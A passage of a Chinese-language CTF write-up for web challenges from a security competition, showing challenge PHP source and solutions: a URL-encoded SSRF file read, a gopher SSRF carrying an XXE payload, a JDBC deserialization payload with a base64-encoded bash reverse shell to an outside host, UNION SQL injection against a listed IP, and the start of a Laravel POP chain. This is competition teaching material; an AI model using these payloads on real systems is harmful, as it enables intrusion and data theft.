class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#本题无法访问外网</span></span><br><span class="line"><span class="comment">#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了</span></span><br><span class="line"><span class="comment">#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好</span></span><br><span class="line"><span class="comment">#there is xxe.php</span></span><br><span class="line">$poc=$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/log|flag|hist|dict|etc|file|write/i"</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$ids=explode(<span class="string">'&amp;'</span>,$poc);</span><br><span class="line">$a_key=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line">$b_key=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">$a_value=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line">$b_value=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$a_key||!$b_key||!$a_value||!$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'我什么都没有~'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a_key==$b_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"trick"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a_value!==$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($_GET)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'be it so'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">        $url=$value;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, 'post_data');</span></span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    var_dump($res);</span><br></pre></td></tr></table></figure><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#这题在上午的时候为了防止有人用webshell扫描器d，有一段时间临时过滤了system关键字，但是这个关键字在解题中是用不到的，所以才过滤它，给选手造成的不便请您谅解</span></span><br><span class="line"><span class="comment">#这题和命令执行无关，请勿尝试</span></span><br><span class="line"><span class="comment">#there is main.php and hints.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$data = preg_replace(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,$data);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($dom);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line">div.main&#123;</span><br><span class="line">    width:<span class="number">90</span>%;</span><br><span class="line">    max-width:<span class="number">50</span>%;</span><br><span class="line">    margin:<span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line">textarea&#123;</span><br><span class="line">    width:<span class="number">100</span>%;</span><br><span class="line">    height:<span class="number">100</span>%;</span><br><span class="line">&#125;</span><br><span class="line">input[type=<span class="string">"submit"</span>]&#123;</span><br><span class="line">    margin: <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class="main"&gt;</span><br><span class="line">    &lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;textarea name=<span class="string">"data"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ($data!=<span class="keyword">false</span>)?htmlspecialchars($data):htmlspecialchars(<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/textarea&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input style=<span class="string">""</span> type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>/&gt;</span><br><span class="line">        &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a target=<span class="string">"_blank"</span> href=<span class="string">"&lt;?php echo basename(__FILE__).'?s';?&gt;"</span>&gt;View Source Code&lt;/a&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($resp);<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $object;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $variable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $o = <span class="keyword">$this</span>-&gt;object;</span><br><span class="line">        $m = <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">        $v = <span class="keyword">$this</span>-&gt;variable;</span><br><span class="line">        $o-&gt;$m();</span><br><span class="line">        <span class="keyword">global</span> $$v;</span><br><span class="line">        $answer = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $answer;</span><br><span class="line">        <span class="keyword">echo</span> $answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'‬'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'‬'</span>])-&gt;CaptureTheFlag();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you do not pass the misc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hints.php</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">#there is an main.php</span></span><br><span class="line"><span class="meta">#“大佬，要不咱们用一个好长好长的数字的md5做通信密码吧”</span></span><br><span class="line"><span class="meta">#“那你给我算一个出来”</span></span><br><span class="line"><span class="meta">#“好的”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#小白打开了win10的calc，开始计算8129947191207+1992100742919</span></span><br><span class="line"><span class="meta">#然后他直接用鼠标复制了结果，计算md5值</span></span><br><span class="line"><span class="meta">#“好了大佬，10122047934126的md5值”</span></span><br><span class="line"><span class="meta">#“6dc6a29df1d7d33166bba5e17e42d2ea对吧”</span></span><br><span class="line"><span class="meta">#“哈？？？不是3e3e7d453061d953bce39ed3e82fd2a1吗”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#“咱们对一下数字？”</span></span><br><span class="line"><span class="meta">#‭10122047934126‬</span></span><br><span class="line"><span class="meta">#10122047934126</span></span><br><span class="line"><span class="meta">#“这不是一样的吗....咋就md5不一样了.......”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#找出来到底哪里出了问题，就可以看这道web题目了</span></span><br></pre></td></tr></table></figure><p>根据这里hints.php的内容提示，win10的计算器鼠标直接复制后，会在数字的前后加上两个不可见的unicode字符%e2%80%ad和%e2%80%ac，在这里的<code>unserialize($_GET[&#39;‬&#39;])</code>部分，测试后发现可以用<code>%e2%80%ac=123</code>传参内容。<br>到这一步按照预期应该是利用两个类的反序列化操作去想办法读取flag.txt内容了，但是其实回过头看看，xxe.php已经能够任意文件读取了不是吗？</p><ol><li><p>url编码绕过</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$poc</span>=<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];  <span class="comment">#不会对url解码，所以直接绕过过滤</span></span><br></pre></td></tr></table></figure><p> payload</p><p> <code>a=%66%69%6c%65:///var/www/html/%66%6c%61%67.php&amp;b=%66%69%6c%65:///var/www/html/%6 6%6c%61%67.php</code></p><p> <img src="/2020/06/第四届第五空间安全大赛/image-20200626110638762.png" alt="image-20200626110638762"></p></li><li><p>gopher</p><p> SSRF 利用 gopher 模拟 POST 请求，访问 xxe.php，然后利用 xxe 来读文件</p><p> index.php 用的过滤函数是 preg_match</p><p> 而在 xxe.php 里用的是 replace</p> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_replace</span><span class="params">(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,<span class="variable">$data</span>)</span></span></span><br></pre></td></tr></table></figure><p> 那么可以直接用 双写的方式来 bypass, 类似这样：</p> <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flreadag</span>   ==&gt; preg_replace(<span class="string">"/flag/i"</span>, <span class="string">''</span>, <span class="variable">$data</span>) ==&gt; flag</span><br></pre></td></tr></table></figure><p> 接着xxe读取文件</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ureadtf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/rereadad=convert.base64-encode/resource=flreadag.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>先URL编码下，谁便POST一下获取<code>Content-Length</code></p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626120356953.png" alt="image-20200626120356953"></p><p>然后将data再URL编码两次(用PHP函数)</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626120455719.png" alt="image-20200626120455719"></p><p>payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=1&amp;b=1&amp;c=gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%2520611%250D%250A%250D%250Adata%253D%25253c%25253f%252578%25256d%25256c%252520%252576%252565%252572%252573%252569%25256f%25256e%25253d%252522%252531%25252e%252530%252522%252520%252565%25256e%252563%25256f%252564%252569%25256e%252567%25253d%252522%252575%252572%252565%252561%252564%252574%252566%25252d%252538%252522%25253f%25253e%25250a%25253c%252521%252544%25254f%252543%252554%252559%252550%252545%252520%252578%252565%252520%25255b%25250a%25253c%252521%252545%25254c%252545%25254d%252545%25254e%252554%252520%25256e%252561%25256d%252565%252520%252541%25254e%252559%252520%25253e%25250a%25253c%252521%252545%25254e%252554%252549%252554%252559%252520%252578%252565%252520%252553%252559%252553%252554%252545%25254d%252520%252522%252570%252568%252570%25253a%25252f%25252f%252566%252569%25256c%252574%252565%252572%25252f%252572%252565%252572%252565%252561%252564%252561%252564%25253d%252563%25256f%25256e%252576%252565%252572%252574%25252e%252562%252561%252573%252565%252536%252534%25252d%252565%25256e%252563%25256f%252564%252565%25252f%252572%252565%252573%25256f%252575%252572%252563%252565%25253d%252566%25256c%252572%252565%252561%252564%252561%252567%25252e%252570%252568%252570%252522%252520%25253e%25255d%25253e%25250a%25253c%252572%25256f%25256f%252574%25253e%25250a%25253c%25256e%252561%25256d%252565%25253e%252526%252578%252565%25253b%25253c%25252f%25256e%252561%25256d%252565%25253e%25250a%25253c%25252f%252572%25256f%25256f%252574%25253e</span><br></pre></td></tr></table></figure><h3 id="3-zzm’s-blog"><a href="#3-zzm’s-blog" class="headerlink" title="3.zzm’s blog"></a>3.<strong>zzm’s blog</strong></h3><p>根据题目给的pom.xml</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626132854601.png" alt="image-20200626132854601"></p><p>和这篇<a href="https://b1ue.cn/archives/189.html#pom.xml" target="_blank" rel="noopener">文章</a>jdbc url可以指定导致rce</p><p>先搭一个<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">恶意的mysql服务器</a>和JAVA序列化的工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133727220.png" alt="image-20200626133727220"></p><p>接着监听端口</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133825721.png" alt="image-20200626133825721"></p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"id"</span>:[<span class="string">"com.mysql.cj.jdbc.admin.MiniAdmin"</span>, <span class="string">"jdbc:mysql://ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections5_bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mICAgL2Rldi90Y3AvMS4xLjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>]&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133930336.png" alt="image-20200626133930336"></p><h3 id="4-美团外卖"><a href="#4-美团外卖" class="headerlink" title="4.美团外卖"></a>4.<strong>美团外卖</strong></h3><p><code>www.zip</code>源码泄露</p><p>在daochu.php存在注入</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type=$_GET[<span class="string">'type'</span>];</span><br><span class="line">$imei=$_GET[<span class="string">'imei'</span>];</span><br><span class="line">$imei2=$_GET[<span class="string">'imei2'</span>];</span><br><span class="line"><span class="keyword">if</span>($type==<span class="number">1</span>)&#123;</span><br><span class="line">true$biao=<span class="string">'content'</span>;</span><br><span class="line">true$result = mysqli_query($link,<span class="string">'select * from '</span>.$biao.<span class="string">' where imei="'</span>.$imei.<span class="string">'" and  imei2="'</span>.$imei2.<span class="string">'"'</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="symbol">%23</span> //字段数为<span class="number">6</span></span><br></pre></td></tr></table></figure><p>回显4，6，2, 3</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627101937077.png" alt="image-20200627101937077"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(schema_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.schemata<span class="symbol">%23</span>  //数据库名</span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627102635262.png" alt="image-20200627102635262"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(table_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema='cms'<span class="symbol">%23</span>   //表</span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627102842991.png" alt="image-20200627102842991"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(column_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>d'cms'<span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>table_name<span class="symbol">%3</span>d'hint'<span class="symbol">%23</span> //字段</span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627104512801.png" alt="image-20200627104512801"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(hints)<span class="symbol">%20</span>from<span class="symbol">%20</span>hint<span class="symbol">%23</span></span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627104803417.png" alt="image-20200627104803417"></p><p>开始不能访问的<code>/lib/webuploader/0.1.5/server/preview.php</code>加上这个目录就行了，POST数据就行</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627105703977.png" alt="image-20200627105703977"></p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627105855419.png" alt="image-20200627105855419"></p><h3 id="5-laravel"><a href="#5-laravel" class="headerlink" title="5.laravel"></a>5.<strong>laravel</strong></h3><p><code>./artisan -v</code>  得到版本 <code>Laravel Framework 5.7.28</code></p><p>5.7.X版本存在一个反序列化漏洞,根据<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">文章</a>查看源码发现 <code>vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php</code>的 <code>run</code>方法被删除了，只能找其他链子</p><p>然后根据这篇<a href="https://www.anquanke.com/post/id/184541#h3-2%E3%80%82" target="_blank" rel="noopener">文章</a></p><p>根据文件对比工具</p><p><code>app\Http\Controllers\TaskController.php</code>有个反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">true <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">truetrue unserialize($_GET[<span class="string">'p'</span>]);</span><br><span class="line">true &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"There is an param names p (get)"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>routes\web.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'/index'</span>, <span class="string">'TaskController@index'</span>);</span><br></pre></td></tr></table></figure><p>POP</p><figure class="highlight php"><table><tr><td 